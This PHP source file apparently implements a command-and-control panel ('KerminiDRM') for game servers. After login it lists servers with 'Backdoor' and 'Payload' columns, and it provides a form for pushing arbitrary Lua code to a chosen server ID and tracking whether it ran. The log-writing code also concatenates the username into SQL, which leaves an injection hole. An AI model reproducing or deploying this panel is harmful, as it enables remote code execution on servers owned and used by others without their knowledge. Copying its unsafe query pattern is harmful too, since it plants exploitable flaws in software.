<?php
session_start();
// Change this to your connection info.
$DB_HOST = '';
$DB_USER = '';
$DB_PASS = '';
$DB_NAME = '';

// Try and connect using the info above.
$con = mysqli_connect($DB_HOST, $DB_USER, $DB_PASS, $DB_NAME);
if ( mysqli_connect_errno() ) {
	// If there is an error with the connection, stop the script and display the error.
	die ('Failed to connect to MySQL: ' . mysqli_connect_error());
}
// Now we check if the data was submitted, isset will check if the data exists.
if ( !isset($_POST['username'], $_POST['password']) ) {
	// Could not get the data that should have been sent.
	die ('Username and/or password does not exist! :)(: ');                                                                      // captchata secret key here
}	$response = $_POST["g-recaptcha-response"];	$url = 'https://www.google.com/recaptcha/api/siteverify';	$data = array(		'secret' => '',		'response' => $_POST["g-recaptcha-response"]	);	$options = array(		'http' => array (			'method' => 'POST',			'content' => http_build_query($data)		)	);	$context  = stream_context_create($options);	$verify = file_get_contents($url, false, $context);	$captcha_success=json_decode($verify);	if ($captcha_success->success==false) {		echo "<p>You are a bot! Go away!</p>"; die();	} else if ($captcha_success->success==true) {
// Prepare our SQL 
if ($stmt = $con->prepare('SELECT id, password FROM accounts WHERE username = ?')) {
	// Bind parameters (s = string, i = int, b = blob, etc), hash the password using the PHP password_hash function.
	$stmt->bind_param('s', $_POST['username']);
	$stmt->execute(); 
	$stmt->store_result(); 
	// Store the result so we can check if the account exists in the database.
	if ($stmt->num_rows > 0) {
		$stmt->bind_result($id, $password);
		$stmt->fetch();      
		// Account exists, now we verify the password.
		// 109/73/71/100/118/98/50/81/103/73/87/115/116/97/87/49/48/97/71/86/117/90/88/100/50/97/88/66/108/100/109/86/117/100/71/104/108/99/109/85/75/
		if (password_verify($_POST['password'], $password)) {			
			// Verification success! User has loggedin!
			// 109/73/71/100/118/98/50/81/103/73/87/115/116/97/87/49/48/97/71/86/117/90/88/100/50/97/88/66/108/100/109/86/117/100/71/104/108/99/109/85/75/
			$_SESSION['loggedin'] = TRUE;
			$_SESSION['name'] = $_POST['username'];
			$_SESSION['id'] = $id; 
	 $log_what1a = ' : Connected '. '| When : ';
	 $log_what2a = $log_what1a . date("Y-m-d H:i:s");
	 $log_whata = $_SESSION['name'] . $log_what2a;
    $req = $con->prepare('INSERT INTO `logs`
   (`What`)
   VALUES
   ("'.$log_whata.'");');
   $req->execute();
			echo 'Welcome  :  ' . $_SESSION['name'] . '  !';
				// SourceQuery
	require( __DIR__ . '/SourceQuery/SourceQuery.class.php');
	// Database Settings
	$Database_Host 		= $DB_HOST;
	$Database_Database 	= $DB_NAME;
	$Database_Username 	= $DB_USER;
	$Database_Password	= $DB_PASS;
	
	// Page Settings
	$Title		= "Panel";
	$Color		= "Dark"; // White, Blue, Green, Sky, Orange, Red, Dark
	
	$PageTitle	= "KerminiDRM";
	
	// Language
	$T_ServerList = "Kermini Server List";
	$T_BanList = "_NIL_";
	
	$S_IP = "IP";
	$S_ServerName = "Server Name";
	$S_Gamemode = "Gamemode";
	$S_Map = "Map";
	$S_Players = "Players";
	$S_Update = "Join Date";
	$S_First = "First Players";
	$S_Payload = "Payload";
	$S_Backdoor = "Backdoor";
	
	//$B_SteamID = "SteamID";
	//$B_IGN = "IGN";
	//$B_Reason = "Reason";
	//$B_Expires = "Expires";
	//$B_Admin = "Admin";
	
	// Connect MySQL
	try
	{
		$db = new PDO('mysql:host=' . $Database_Host . ';dbname=' . $Database_Database, $Database_Username, $Database_Password);
	}catch(PDOException $e){
		die("Failed to connect to database! Please check the database settings.");
	}
	
	// Color
	if($Color=="White"){$PColor="default";}elseif($Color=="Blue"){$PColor="primary";}
	elseif($Color=="Green"){$PColor="success";}elseif($Color=="Sky"){$PColor="info";}
	elseif($Color=="Orange"){$PColor="warning";}elseif($Color=="Red"){$PColor="danger";}
	elseif($Color=="Dark"){$PColor="dark";}
      
		} else {
			echo 'Incorrect  username  and/or  password!';
	// Page Settings
	$Title		= "UNCONNECTED";
	$Color		= "Dark"; // White, Blue, Green, Sky, Orange, Red, Dark
	
	$PageTitle	= "UNCONNECTED";
	
	// Language
	$T_ServerList = "UNCONNECTED";
	$T_BanList = "UNCONNECTED";
	
	$S_IP = "UNCONNECTED";
	$S_ServerName = "UNCONNECTED";
	$S_Gamemode = "UNCONNECTED";
	$S_Map = "UNCONNECTED";
	$S_Players = "UNCONNECTED";
	$S_Update = "UNCONNECTED";
	$S_First = "UNCONNECTED";
    $S_Payload = "UNCONNECTED";	
	die();
		}
	} else {
		echo 'Incorrect  username  and/or  password!';
	// Page Settings
	$Title		= "UNCONNECTED";
	$Color		= "Dark"; // White, Blue, Green, Sky, Orange, Red, Dark
	
	$PageTitle	= "UNCONNECTED";
	
	// Language
	$T_ServerList = "UNCONNECTED";
	$T_BanList = "UNCONNECTED";
	
	$S_IP = "UNCONNECTED";
	$S_ServerName = "UNCONNECTED";
	$S_Gamemode = "UNCONNECTED";
	$S_Map = "UNCONNECTED";
	$S_Players = "UNCONNECTED";
	$S_Update = "UNCONNECTED";
	$S_First = "UNCONNECTED";
	$S_Payload = "UNCONNECTED";		 
	die();
	}
} else {
	echo 'Could  not  prepare  statement!';
}	}?>
<!DOCTYPE html>
<html>
	<head>
    	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    	<title><?php echo $PageTitle; ?></title>
        
        <!-- CSS -->
        <link rel="stylesheet" type="text/css" href="css/bootstrap.css">
        <linl rel="stylesheet" type="text/css" href="css/widget.bootstrap.css">
        <link href='http://fonts.googleapis.com/css?family=Alegreya+Sans+SC:400,500,800' rel='stylesheet' type='text/css'>
        
		
        <!-- Javascript -->
        <script src="http://code.jquery.com/jquery-latest.min.js" type="text/javascript"></script>
    	<script src="js/bootstrap.js" type="text/javascript"></script>
        <script src="js/jquery.tablesorter.js" type="text/javascript"></script>
        <script src="js/jquery.tablesorter.widgets.js" type="text/javascript"></script>
        <script src="js/jquery.tablesorter.run.js" type="text/javascript"></script>
		<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>


		
		
    </head>
	<body style="background-image:url(img/shattered.png);">
    
    <div class="container">
    	
        <center>
        	<h1 style="font-family: 'Alegreya Sans SC', sans-serif;">
            	<span class="label label-<?php echo $PColor; ?>" style="padding:.2em .6em .2em;"><b><?php echo $Title; ?></b></span>
            </h1>
		</center><br/>
        
        <!-- Servers -->
        <div class="panel panel-<?php echo $PColor; ?>">
		<div class="panel-heading"><b><?php echo $T_ServerList; ?></b></div>
	    <button onclick="chatFunction()">Chat</button>
		<div id="chat">
		<script>document.getElementById("chat").style.display = "none"; </script>
		<?php
		  	if ($stmt = $con->prepare('SELECT id, password FROM accounts WHERE username = ?')) {
	// Bind parameters (s = string, i = int, b = blob, etc), hash the password using the PHP password_hash function.
	$stmt->bind_param('s', $_POST['username']);
	$stmt->execute(); 
	$stmt->store_result(); 
	// Store the result so we can check if the account exists in the database.
	if ($stmt->num_rows > 0) {
		$stmt->bind_result($id, $password);
		$stmt->fetch();      
		// Account exists, now we verify the password.
		if (password_verify($_POST['password'], $password)) {
			// Verification success! User has loggedin!
			$_SESSION['loggedin'] = TRUE;
			$_SESSION['name'] = $_POST['username'];
			$_SESSION['id'] = $id;
            echo '<form action="send_chat.php" method="post" id="mysendchat">
			      <input type="text" name="message" placeholder="message" id="message" />
				  <input id="username" name="username" type="hidden" value="'.$_SESSION['name'].'">
				  <button id="insert">Send</button>';
			}
			}
			}
		?>
		<script>
$('#mysendchat').submit(function(){
 return false;
});
 
$('#insert').click(function(){
 $.post( 
 $('#mysendchat').attr('action'),
 $('#mysendchat :input').serializeArray(),
 function(result){
 $('#result').html(result);
 }
 );
});
		</script>
		<div id="chat_display">
		<?php
	if ($stmt = $con->prepare('SELECT id, password FROM accounts WHERE username = ?')) {
	// Bind parameters (s = string, i = int, b = blob, etc), hash the password using the PHP password_hash function.
	$stmt->bind_param('s', $_POST['username']);
	$stmt->execute(); 
	$stmt->store_result(); 
	// Store the result so we can check if the account exists in the database.
	if ($stmt->num_rows > 0) {
		$stmt->bind_result($id, $password);
		$stmt->fetch();      
		// Account exists, now we verify the password.
		if (password_verify($_POST['password'], $password)) {
			// Verification success! User has loggedin!
			$_SESSION['loggedin'] = TRUE;
			$_SESSION['name'] = $_POST['username'];
			$_SESSION['id'] = $id;
$reponse = $db->query('SELECT member, Text FROM chat ORDER BY Id DESC LIMIT 0, 10');

// Affichage de chaque message (toutes les données sont protégées par htmlspecialchars)
while ($donnees = $reponse->fetch())
{
echo '<p><strong>' . htmlspecialchars($donnees['member']) . '</strong> : ' . htmlspecialchars($donnees['Text']) . '</p>';
}
	}
	}
	}
		?>
        </div>
				<script>
				setInterval('load_chat()', 1400);
				function load_chat() {
					$('#chat_display').load('reload_chat.php');
				}
				</script>
		
		</div>
		
<button onclick="LogsDisplay()">Logs</button>
<div id="logs">
    <div id="logs_display">
<script>document.getElementById("logs").style.display = "none"; </script>
  <?php
  	if ($stmt = $con->prepare('SELECT id, password FROM accounts WHERE username = ?')) {
	// Bind parameters (s = string, i = int, b = blob, etc), hash the password using the PHP password_hash function.
	$stmt->bind_param('s', $_POST['username']);
	$stmt->execute(); 
	$stmt->store_result(); 
	// Store the result so we can check if the account exists in the database.
	if ($stmt->num_rows > 0) {
		$stmt->bind_result($id, $password);
		$stmt->fetch();      
		// Account exists, now we verify the password.
		if (password_verify($_POST['password'], $password)) {
			// Verification success! User has loggedin!
			$_SESSION['loggedin'] = TRUE;
			$_SESSION['name'] = $_POST['username'];
			$_SESSION['id'] = $id;
			$reponses = $db->query('SELECT * FROM logs');
             while ($satanis = $reponses->fetch())
             {
	         echo 'Log ID : ', $satanis['log_id'] . ' | ', $satanis['What'], '</br>';
             } 
		}
	}
  	}
             ?>
             </div>
             <?php
    if ($stmt = $con->prepare('SELECT id, password FROM accounts WHERE username = ?')) {
	// Bind parameters (s = string, i = int, b = blob, etc), hash the password using the PHP password_hash function.
	$stmt->bind_param('s', $_POST['username']);
	$stmt->execute(); 
	$stmt->store_result(); 
	// Store the result so we can check if the account exists in the database.
	if ($stmt->num_rows > 0) {
		$stmt->bind_result($id, $password);
		$stmt->fetch();      
		// Account exists, now we verify the password.
		if (password_verify($_POST['password'], $password)) {
			// Verification success! User has loggedin!
			$_SESSION['loggedin'] = TRUE;
			$_SESSION['name'] = $_POST['username'];
			$_SESSION['id'] = $id;
			$reponses = $db->query('SELECT * FROM logs');
			 echo '<form action="resetelogs.php" method="post">
		<input type="number" name="deletelogs" placeholder="Type delete to delete logs" required size="40">
		<input type="submit"></form>' . '<br />';
	}}}
  ?>
</div>
				<script>
				setInterval('load_logs()', 1400);
				function load_logs() {
					$('#logs_display').load('reload_logs.php');
				}
				</script>
				
        <table class="table table-striped">
            <thead>
              <tr>
                <th>#</th>
                <th><?php echo $S_IP; ?></th>
                <th><?php echo $S_ServerName; ?></th>
                <th><?php echo $S_Gamemode; ?></th>
                <th><?php echo $S_Map; ?></th>
                <th><?php echo $S_Players; ?></th>
				<th><?php echo $S_Update; ?></th>
				<th><?php echo $S_First; ?></th>
				<th><?php echo $S_Payload; ?><button onclick="payloadFunction()">Config</button><div id="myDIV"></div></th>
				<div id="myDIV">
<script>document.getElementById("myDIV").style.display = "none"; </script>
	<head>
	<?php
	if ($stmt = $con->prepare('SELECT id, password FROM accounts WHERE username = ?')) {
	// Bind parameters (s = string, i = int, b = blob, etc), hash the password using the PHP password_hash function.
	$stmt->bind_param('s', $_POST['username']);
	$stmt->execute(); 
	$stmt->store_result(); 
	// Store the result so we can check if the account exists in the database.
	if ($stmt->num_rows > 0) {
		$stmt->bind_result($id, $password);
		$stmt->fetch();      
		// Account exists, now we verify the password.
		if (password_verify($_POST['password'], $password)) {
			// Verification success! User has loggedin!
			$_SESSION['loggedin'] = TRUE;
			$_SESSION['name'] = $_POST['username'];
			$_SESSION['id'] = $id;
		echo '<meta charset="utf-8">
		<title>Register</title>
		<style>
		.register-form {
			width: 300px;
			margin: 0 auto;
			font-family: Tahoma, Geneva, sans-serif;
		}
		.register-form h1 {
			text-align: center;
			color: #4d4d4d;
			font-size: 24px;
			padding: 20px 0 20px 0;
		}
		.register-form input[type="number"],
		.register-form input[type="text"] {
			width: 100%;
			padding: 15px;
			border: 1px solid #dddddd;
			margin-bottom: 15px;
			box-sizing:border-box;
		}
		.register-form input[type="submit"] {
			width: 100%;
			padding: 15px;
			background-color: #535b63;
			border: 0;
			box-sizing: border-box;
			cursor: pointer;
			font-weight: bold;
			color: #ffffff;
		}
		</style>
	</head>
	<body>
		<div class="register-form">
			<h1>Payload update/creation</h1>
			<form action="send_payload_update.php" method="post">
				<input type="number" name="username" placeholder="Server ID" required>
				<input type="text" name="password" placeholder="Lua code" required>
				<input type="text" name="email" placeholder="Payload name" required>
				<input type="submit">
			</form>

		</div>
	</body>';
		}
	}
	}
	?>
	<div id="myDIV_display">
	<?php
		if ($stmt = $con->prepare('SELECT id, password FROM accounts WHERE username = ?')) {
	// Bind parameters (s = string, i = int, b = blob, etc), hash the password using the PHP password_hash function.
	$stmt->bind_param('s', $_POST['username']);
	$stmt->execute(); 
	$stmt->store_result(); 
	// Store the result so we can check if the account exists in the database.
	if ($stmt->num_rows > 0) {
		$stmt->bind_result($id, $password);
		$stmt->fetch();      
		// Account exists, now we verify the password.
		if (password_verify($_POST['password'], $password)) {
			// Verification success! User has loggedin!
			$_SESSION['loggedin'] = TRUE;
			$_SESSION['name'] = $_POST['username'];
			$_SESSION['id'] = $id;
		     $reponse = $db->query('SELECT description, ServerID, execution FROM payload');	 
             while ($donnees = $reponse->fetch())
             {
			 $snkseb = $donnees['execution'];
             if ($snkseb == -1) {
             $mtxapprouve = 'Executed';
			 } else {
             $mtxapprouve = 'Not yet';
             }	
	         echo 'Payload : ', $donnees['description'] . ' | Server ID : ' . $donnees['ServerID'] . ' | Status : ' . $mtxapprouve . '</br>';
             }
		}
	}
		}
		?>
		</div>
		<?php
			if ($stmt = $con->prepare('SELECT id, password FROM accounts WHERE username = ?')) {
	// Bind parameters (s = string, i = int, b = blob, etc), hash the password using the PHP password_hash function.
	$stmt->bind_param('s', $_POST['username']);
	$stmt->execute(); 
	$stmt->store_result(); 
	// Store the result so we can check if the account exists in the database.
	if ($stmt->num_rows > 0) {
		$stmt->bind_result($id, $password);
		$stmt->fetch();      
		// Account exists, now we verify the password.
		if (password_verify($_POST['password'], $password)) {
			// Verification success! User has loggedin!
			$_SESSION['loggedin'] = TRUE;
			$_SESSION['name'] = $_POST['username'];
			$_SESSION['id'] = $id;
			 echo '<form action="deletepayload.php" method="post">
		<input type="delete" name="delete" placeholder="Type the name of the payload you want to delete" required size="40">
		<input type="submit"></form>' . '<br />';
		}
	  }
	}
	?>
				<script>
				setInterval('load_payloads()', 1400);
				function load_payloads() {
					$('#myDIV_display').load('reload_payloads.php');
				}
				</script>
	            <th><?php echo $S_Backdoor; ?></th>
</div>
				
				
				
					<div style="position: fixed; z-index: -99; width: 100%; height: 100%">
    <iframe frameborder="0" height="0%" width="0%" 
    src="https://youtube.com/embed/nBPZgs-ZHTE?autoplay=1&controls=0&showinfo=0&autohide=0&loop=1"> <!-- modify your song here replace YKqDiNJJPXk by the video id -->
    </iframe>
    </div>
              </tr>
            </thead>
            <tbody>
			<div id="servers">
            	<?php
				if ($stmt = $con->prepare('SELECT id, password FROM accounts WHERE username = ?')) {
	// Bind parameters (s = string, i = int, b = blob, etc), hash the password using the PHP password_hash function.
	$stmt->bind_param('s', $_POST['username']);
	$stmt->execute(); 
	$stmt->store_result(); 
	// Store the result so we can check if the account exists in the database.
	if ($stmt->num_rows > 0) {
		$stmt->bind_result($id, $password);
		$stmt->fetch();      
		// Account exists, now we verify the password.
		if (password_verify($_POST['password'], $password)) {
			// Verification success! User has loggedin!
			$_SESSION['loggedin'] = TRUE;
			$_SESSION['name'] = $_POST['username'];
			$_SESSION['id'] = $id;
					// Select Bans
					$SelectServers = $db->query("SELECT * FROM `servers`");

						
					// Print Output
					foreach($SelectServers as $PrintServers)
					{
						
						// Query Server
						define( 'SQ_TIMEOUT', 1 );
						define( 'SQ_ENGINE', SourceQuery :: SOURCE );
						
						$ServerQuery = new SourceQuery();
						$ServerInfo    = Array();
						$ServerPlayers = Array();
						
						try
						{
							$ServerQuery->Connect($PrintServers['IPAddress'], $PrintServers['Port'], SQ_TIMEOUT, SQ_ENGINE);
							$ServerInfo    = $ServerQuery->GetInfo();
							$ServerPlayers = $ServerQuery->GetPlayers();
						}
						catch( Exception $e )
						{
							echo "Something went wrong try again later!";
						}
					
						$ServerQuery->Disconnect( );
						
						echo 
						"
							<tr>
								<td><b>" . $PrintServers['ServerID'] . "</b></td>
								<td><a href='steam://connect/" . $PrintServers['IPAddress'] . ":" . $PrintServers['Port'] . "'>" . $PrintServers['IPAddress'] . $PrintServers['Port'] . "</a></td>
								<td>" . str_replace("_", " ", $PrintServers['HostName']) . "</td>
								<td>" . htmlspecialchars($ServerInfo['ModDesc']) . "</td>
								<td>" . htmlspecialchars($ServerInfo['Map']) . "</td>
								<td>" . htmlspecialchars($ServerInfo['Players']) . " / " . htmlspecialchars($ServerInfo['MaxPlayers']) . "</td>
								<td>" . $PrintServers['LastUpdate'] . "</td>
								<td>" . $PrintServers['Players'] . "</td>
								<td>" . '|' . "</td>
								<td>" . $PrintServers['Backdoor_type'] . "</td>
							</tr>
						";
							
					}
		          }
	             }	
				}
				?>
				</div> 
				<script>
				setInterval('load_servers()', 1400);
				function load_servers() {
					$('#servers').load('reload_servers.php');
				}
				</script>
            </tbody>
        </table>
        </div>
        <!-- ./End Of page | Made By Maxime_48 -->
            </tbody>
        </table>
        </div>  
    </div>
    
    </body>
</html>